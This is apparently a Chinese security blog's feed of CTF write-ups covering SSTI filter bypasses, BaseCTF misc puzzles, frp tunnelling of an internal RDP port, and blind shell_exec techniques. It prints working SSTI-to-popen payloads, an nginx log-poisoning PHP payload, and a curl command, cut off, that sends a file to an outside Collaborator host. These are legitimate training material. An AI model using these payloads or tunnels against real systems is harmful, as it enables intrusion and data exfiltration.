alt="image-20240911204933643"></p><blockquote><p>输入1111，试试看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911205018866.png" alt="image-20240911205018866"></p><blockquote><p>表面在/get_flag路径下可能存在ssti漏洞。方法是post，变量是name。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911205753411.png" alt="image-20240911205753411"></p><blockquote><p>直接使用fenjing工具拿到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911210006897.png" alt="image-20240911210006897"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911210026354.png" alt="image-20240911210026354"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量代理和frp使用</title>
      <link href="/posts/502156a3.html"/>
      <url>/posts/502156a3.html</url>
      
        <content type="html"><![CDATA[<p>流量代理:<a href="https://blog.csdn.net/zkaqlaoniao/article/details/138181219">https://blog.csdn.net/zkaqlaoniao/article/details/138181219</a></p><p>frp实现内网端口转发https://www.cnblogs.com/xuanlvsec/p/13723495.html</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145017.png" alt=""></p><h2 id="前言">前言</h2><p>frp 是一个高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p><ul><li>利用处于防火墙后的机器，对外网环境提供 http 或 https 服务。</li><li>对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</li><li>利用处于防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司局部环境的主机。</li></ul><p>（摘自百度百科）</p><h2 id="环境准备">环境准备</h2><p>准备一台内网windows服务器虚拟机</p><p>一台公网服务器</p><p>一台pc（不要是windows虚拟机的宿主机）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内网windows服务器         192.168.244.130</span><br><span class="line">公网linux服务器           152.X.X.X</span><br></pre></td></tr></table></figure><p>设置内网Windows服务器防火墙不放行3389端口</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924102912758-167415936.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2163870-20200924102912758-167415936.png" alt="img"></a></p><h2 id="frp下载">frp下载</h2><p>Github地址:<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>本次试验用的是一台linux服务器和一台windows服务器，下载的时候记得下载对应操作系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frp_0.34.0_windows_amd64.zip</span><br><span class="line">frp_0.34.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="开整">开整</h2><p>本次的试验目的是在另一台pc上连接内网服务器的3389端口，在环境搭建阶段我们已经将防火墙打开，而且由于pc和内网服务器不在同一网段，所以是无法直接连3389的，因此，我们需要将内网服务器的3389转发出来，转发到公网服务器的一个端口上，这样我们通过连接公网服务器的某个端口，就可以访问内网服务器的3389了。整个流程如下。（没啥专业的画图软件只能用windwos自带的画图了，原谅我的灵魂画术）</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924105019581-737106838.png"><img src="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924105019581-737106838.png" alt="img"></a></p><p><strong>第一步 将frp上传到公网服务器和内网服务器上</strong></p><p>将对应操作系统的包分别上传到两台服务器上</p><p><strong>第二步 配置客户端及服务端，并启动</strong></p><p>我们将window服务器作为客户端，公网服务器作为服务端</p><p>先配置服务端</p><p>编辑frps.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>打开文件默认就是这个，不用动，保持这样就行，这是配置服务端的端口，然后用下面的命令启动服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p>启动完了以后先放着，再配置客户端</p><p>编辑Windows服务器上的frpc.ini,做如下配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 152.x.x.x     #服务端ip，也就是公网服务器ip</span><br><span class="line">server_port = 7000          #服务器端口</span><br><span class="line">[ssh]                       #这个是节点名称，可以随便写</span><br><span class="line">type = tcp                  #通信协议</span><br><span class="line">local_ip = 127.0.0.1        #本地地址</span><br><span class="line">local_port = 3389           #要转发的端口</span><br><span class="line">remote_port = 6000          #要转发到的远程端口</span><br></pre></td></tr></table></figure><p>配置完成后，运行以下命令启动客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><p>随后就能看到服务端显示有新的客户端连进来了</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924120358152-425470860.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2163870-20200924120358152-425470860.png" alt="img"></a></p><p><strong>第三步 连接远程桌面</strong></p><p>使用pc连接公网服务器的6000端口，连接成功</p><p><a href="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924120845320-361076319.png"><img src="https://img2020.cnblogs.com/blog/2163870/202009/2163870-20200924120845320-361076319.png" alt="img"></a></p><h2 id="总结">总结</h2><p>内网端口转发和反向隧道的建立大多数工具都是这种方式，内网做客户端主动向外网服务端通信，了解了这种方式就能更好的理解大多数端口转发的操作了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF-week3-wp</title>
      <link href="/posts/7f421f2e.html"/>
      <url>/posts/7f421f2e.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="misc">misc</h2><h4 id="Week3-broken-mp4">[Week3] broken.mp4</h4><p>考点：破损的mp4，untrunc工具</p><p>下载附件，是一个完整的mp4和一个破损的mp4，用untrunc工具进行修复破损的mp4，播放视频就能看到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911000105138.png" alt="image-20240911000105138"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911000315052.png" alt="image-20240911000315052"></p><h4 id="Week3-我要吃火腿！">[Week3] 我要吃火腿！</h4><p>考点：兽音解密，python代码审计，破损文件修复，文件分离，SSTV</p><p>下载附件，解压。有一个破损的jpg文件和一个txt文件。打开txt文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911224023855.png" alt="image-20240911224023855"></p><p>发现是兽音，在线直接解密。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911224225507.png" alt="image-20240911224225507"></p><p>得到一串python代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def xor_with_ham(input_file, output_file):</span><br><span class="line">    ham_bytes = [0x48, 0x61, 0x6D]</span><br><span class="line">    </span><br><span class="line">    with open(input_file, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = bytearray(f.read())</span><br><span class="line"></span><br><span class="line">    for i in range(len(data)):</span><br><span class="line">        data[i] ^= ham_bytes[i % 3]</span><br><span class="line"></span><br><span class="line">    with open(output_file, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line">xor_with_ham(&#x27;Hamorl.jpg&#x27;, &#x27;Ham.jpg&#x27;)</span><br></pre></td></tr></table></figure><p>代码审计，发现是进行了异或运算。异或运算具有对称性，即对某个数据进行两次相同的异或操作后，结果会还原为原始数据，换一下处理对象，再运行一边就ok——</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor_with_ham(&#x27;Ham.jpg&#x27;, &#x27;Hamorl.jpg&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911224432266.png" alt="image-20240911224432266"></p><p>得到图片，放进010editor里看看。发现隐藏了wav文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911224611885.png" alt="image-20240911224611885"></p><p>kali机里用foremost分离出来，得到一个音频。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911224716250.png" alt="image-20240911224716250"></p><p>播放发现是刺耳的刺啦刺啦声，猜测是SSTV。使用MMSSTV工具，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240911223740370.png" alt="image-20240911223740370"></p><h4 id="Week3-纯鹿人">[Week3] 纯鹿人</h4><p>考点：文件分离</p><p>下载附件是个docx文件，查看，将图片移动一下，ctrl+a全选，发现猫腻</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912215749109.png" alt="image-20240912215749109"></p><p>换个字体颜色，看到一串base64代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912215820604.png" alt="image-20240912215820604"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912215841006.png" alt="image-20240912215841006"></p><p>盲猜password应该是个压缩包的，把docx文件放进010查看一下。确认是压缩包。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912215937669.png" alt="image-20240912215937669"></p><p>改后缀名后解压，找到里面唯一的图片。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912220017703.png" alt="image-20240912220017703"></p><p>放进010查看，发现隐藏压缩包文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912220102159.png" alt="image-20240912220102159"></p><p>进行文件分离，提取出压缩包，密码就是上面的密码，最后得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912220202811.png" alt="image-20240912220202811"></p><h2 id="web">web</h2><h4 id="复读机">复读机</h4><p>经典的SSTI，过滤了一些关键字和一些符号，经过测试，过滤了以下符号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ - * / . &#123;&#123; &#125;&#125; __ : &quot; \</span><br></pre></td></tr></table></figure><p>先是使用继承链走到 RCE</p><p>过滤了 <code>.</code> ，可以用中括号绕，过滤了关键字，可以在关键字中间插入一对单引号 <code>''</code></p><p>寻找能 RCE 的类，比如 ``</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>])%&#125;</span><br></pre></td></tr></table></figure><p>接着使用这个类里的 <code>popen</code> 函数来 RCE</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;pwd&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>因为过滤了斜杠和反斜杠，无法直接跳到根目录，这里提供三个方法来获取斜杠来跳到根目录</p><p>法一：利用 chr 函数来构造出一个命令</p><p>先找到 chr</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;% set chr= <span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_bui&#x27;</span><span class="string">&#x27;ltins_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;chr&#x27;</span>]%&#125;</span><br><span class="line">&#123;% <span class="built_in">print</span>(chr) %&#125;</span><br></pre></td></tr></table></figure><p>接着用 chr 搭配上数字构造出想要执行的命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;% set chr= <span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_bui&#x27;</span><span class="string">&#x27;ltins_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;chr&#x27;</span>]%&#125;</span><br><span class="line">&#123;% set cmd=<span class="string">&#x27;cat &#x27;</span>~chr(<span class="number">47</span>)~<span class="string">&#x27;flag&#x27;</span> %&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](cmd)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>最后把 cmd 作为 popen 的参数传递进去，即可得到 flag</p><p>同理，利用 format 来得到 <code>/</code> 也是可以的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;% set cmd=<span class="string">&#x27;cat &#x27;</span>~<span class="string">&#x27;%c&#x27;</span>%(<span class="number">47</span>)~<span class="string">&#x27;flag&#x27;</span> %&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](cmd)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>法二：利用环境变量的值</p><p>查看环境变量，可以看到 <code>OLDPWD=/</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;env&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>此时可以直接利用它来切换到根目录，然后再读flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cd $OLDPWD;cat flag&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p>法三：利用 <code>expr substr</code> 切割出一个 <code>/</code></p><p>比如 pwd 中的第一个字符就是 <code>/</code> ，那用 <code>expr substr</code> 切割出来后，之后就可以像法二那样切换到根目录然后读 flag 了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;a=`pwd`;a=`substr $a 1 1`;cd $a;cat flag&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><h4 id="Week3-滤个不停">[Week3] 滤个不停</h4><p>考点：include包含漏洞，nginx日志注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$incompetent = $_POST[&#x27;incompetent&#x27;];</span><br><span class="line">$Datch = $_POST[&#x27;Datch&#x27;];</span><br><span class="line"></span><br><span class="line">if ($incompetent !== &#x27;HelloWorld&#x27;) &#123;</span><br><span class="line">    die(&#x27;写出程序员的第一行问候吧！&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//这是个什么东东？？？</span><br><span class="line">$required_chars = [&#x27;s&#x27;, &#x27;e&#x27;, &#x27;v&#x27;, &#x27;a&#x27;, &#x27;n&#x27;, &#x27;x&#x27;, &#x27;r&#x27;, &#x27;o&#x27;];</span><br><span class="line">$is_valid = true;</span><br><span class="line"></span><br><span class="line">foreach ($required_chars as $char) &#123;</span><br><span class="line">    if (strpos($Datch, $char) === false) &#123;</span><br><span class="line">        $is_valid = false;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($is_valid) &#123;</span><br><span class="line"></span><br><span class="line">    $invalid_patterns = [&#x27;php://&#x27;, &#x27;http://&#x27;, &#x27;https://&#x27;, &#x27;ftp://&#x27;, &#x27;file://&#x27; , &#x27;data://&#x27;, &#x27;gopher://&#x27;];</span><br><span class="line"></span><br><span class="line">    foreach ($invalid_patterns as $pattern) &#123;</span><br><span class="line">        if (stripos($Datch, $pattern) !== false) &#123;</span><br><span class="line">            die(&#x27;此路不通换条路试试?&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    include($Datch);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&#x27;文件名不合规 请重试&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>分析，第一个参数直接传，第二个要绕过两个if语句。</p><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p><p>stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p><p>strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</p><p>strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p><p>发现sever是nginx</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912202350760.png" alt="image-20240912202350760"></p><p>网上查找相关信息，发现可以使用日志注入</p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incompetent=HelloWorld&amp;Datch=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>并在ua(user-agent)处传入执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval(system(&#x27;cat /flag&#x27;));?&gt;</span><br></pre></td></tr></table></figure><p>得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912202642837.png" alt="image-20240912202642837"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell_exec()等函数无回显执行办法</title>
      <link href="/posts/cef3f5c5.html"/>
      <url>/posts/cef3f5c5.html</url>
      
        <content type="html"><![CDATA[<p>遇到shell_exec()函数无回显执行，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">shell_exec($_POST[&#x27;cmd&#x27;]); </span><br></pre></td></tr></table></figure><p>在PHP中 “&gt;” 是表示把什么写入什么文件的意思。</p><p>比如这道题目，<strong>既然无回显，那我就把它写进一个文件，然后访问这个文件不就可以了。</strong></p><p>可以使用burp上的Collaborator抓取。</p><h2 id="以上题为例，详细抓取步骤：">以上题为例，详细抓取步骤：</h2><p>先将无回显的内容保存在一个文件里，post以下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=cat /f* &gt; 2.txt</span><br></pre></td></tr></table></figure><p>这样有了一个文件2.txt，其中是执行了cat /f* 命令的结果，接下来抓取该文件就能看到了。</p><p>使用curl -F将flag文件上传到Burp的Collaborator Client（Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies）(-X指定发送一个POST请求，-F指定要发送的文件)</p><p>获取Collaborator Client分配给BURP的链接：</p><p>打开Burp主界面 --&gt;菜单（Burp）–&gt;Burp Collaboraor Client – &gt; 点击 Copy to Clipboard</p><p>（获取后的链接要手动加上http://，xx=@+要提取的文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=curl -X POST -F xx=@1.txt 